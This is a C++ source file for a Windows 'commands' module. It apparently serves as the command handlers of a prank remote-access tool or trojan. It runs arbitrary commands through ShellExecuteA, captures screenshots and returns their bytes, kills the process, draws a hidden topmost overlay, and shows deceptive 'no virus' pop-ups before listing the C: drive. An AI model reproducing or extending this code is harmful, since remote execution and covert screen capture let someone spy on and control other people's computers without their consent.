#include "Commands.h"

void commands::showMessageBox(const std::vector<std::string>& args)
{
    if (args.size() >= 2) {
        std::string title = args[0];
        std::string message = args[1];

        // Convert title and message to wide strings (required by MessageBoxW)
        std::wstring wTitle(title.begin(), title.end());
        std::wstring wMessage(message.begin(), message.end());

        // Show the Windows message box
        MessageBoxW(nullptr, wMessage.c_str(), wTitle.c_str(), MB_OK | MB_ICONINFORMATION);
    }
    else {
        std::cout << "Invalid number of arguments for 'MessageBox' command.\n";
    }
}

void commands::execute(const std::string& argument)
{
    std::string stemp = argument;
    LPCSTR sw = stemp.c_str();

    ShellExecuteA(0, 0, sw, 0, 0, SW_SHOW);
}

void commands::cringe()
{
    //std::cout << "Cringe() Will return once we can compile without SDL2\n";
    const int SCREEN_WIDTH = 1072;
    const int SCREEN_HEIGHT = 1092;

    SDL_Window* window = NULL;
    SDL_Surface* screenSurface = NULL;

    if (SDL_Init(SDL_INIT_VIDEO) < 0)
    {
        std::cerr << "SDL couldn't initialize: " << SDL_GetError() << std::endl;
        
    }

    window = SDL_CreateWindow("Postin' Cringe", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_SHOWN);
    if (window == NULL)
    {
        std::cerr << "Window couldn't be created: " << SDL_GetError() << std::endl;
        SDL_Quit();
        
    }

    // Get window surface
    screenSurface = SDL_GetWindowSurface(window);

    // Load image using SDL_Image
    SDL_Surface* imageSurface = IMG_Load("assets/imgs/cringe.jpg");
    if (!imageSurface)
    {
        std::cerr << "Failed to load image: " << IMG_GetError() << std::endl;
        SDL_DestroyWindow(window);
        SDL_Quit();
        
    }

    // Fill the surface white
    SDL_FillRect(screenSurface, NULL, SDL_MapRGB(screenSurface->format, 0xFF, 0xFF, 0xFF));

    // Blit the image surface onto the window surface
    SDL_BlitSurface(imageSurface, NULL, screenSurface, NULL);

    // Update the surface
    SDL_UpdateWindowSurface(window);

    // Wait for a while to see the image
    SDL_Delay(5000);

    // Destroy image surface and window
    SDL_FreeSurface(imageSurface);
    SDL_DestroyWindow(window);

    // Quit SDL subsystems
    SDL_Quit();
}

void commands::feesh()
{

}

void commands::StopProcess()
{
    ExitProcess(0);
}

std::vector<char> commands::Screenshot_C()
{
    // Takes the screenshot, and now there should be a file in the active directory called "screenshot.png"
    capture::screenshot();
    return file::readFile("screenshot.png");
}

void DrawPixel(HDC hdc, int x, int y, COLORREF color)
{
    SetPixel(hdc, x, y, color);
    //pixelsRendered[x][y] = true;
}

void RemovePixel(HDC hdc, int x, int y)
{
    SetPixel(hdc, x, y, RGB(0, 0, 0));
    //pixelsRendered[x][y] = true;
}

void commands::randomPixel(int x, int y, int radius)
{
    //bool pixelsRendered[GetSystemMetrics(SM_CXSCREEN)][GetSystemMetrics(SM_CYSCREEN)] = {false};

    POINT mousepos;

    const char class_name[] = "randomPixel";

    WNDCLASS wc = {};

    wc.lpfnWndProc = DefWindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = class_name;

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        class_name,
        "Fook off m8",
        WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), // Position and size, in this case, the entire screen
        NULL, 
        NULL, 
        GetModuleHandle(NULL), 
        NULL
    );

    if (hwnd == NULL)
    {
        std::cerr << "[randomPixel] [!] Failed to create window.\n";
        return;
    }

    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);

    ShowWindow(hwnd, SW_SHOWNORMAL);

    HDC hdc = GetDC(hwnd);

    DrawPixel(hdc, x, y, RGB(255, 0, 0));

    ReleaseDC(hwnd, hdc);

    while(true) 
    {
        GetCursorPos(&mousepos);
        //std::cout << "Mouse X: " << mousepos.x << " Mouse Y: " << mousepos.y << "\n";

        int dx = mousepos.x - x;
        int dy = mousepos.y - y;
        if (sqrt(dx * dx + dy * dy) <= radius) {
            break;
        }
    }

    DestroyWindow(hwnd);
}

void commands::WindowTroll()
{
    std::string message = "May I?";
	std::string title = "100 percent punjabi no virus";

	std::wstring wTitle(title.begin(), title.end());
	std::wstring wMessage(message.begin(), message.end());

    std::string message_end = "Thank you :)";
	std::string title_end = "utterly fucked";

	std::wstring wTitle_end (title_end.begin(), title_end.end());
	std::wstring wMessage_end (message_end.begin(), message_end.end());

    MessageBoxW(nullptr, wMessage.c_str(), wTitle.c_str(), MB_OK | MB_ICONEXCLAMATION);

    system("tree c:/");

    MessageBoxW(nullptr, wMessage_end.c_str(), wTitle_end.c_str(), MB_OK | MB_ICONEXCLAMATION);
}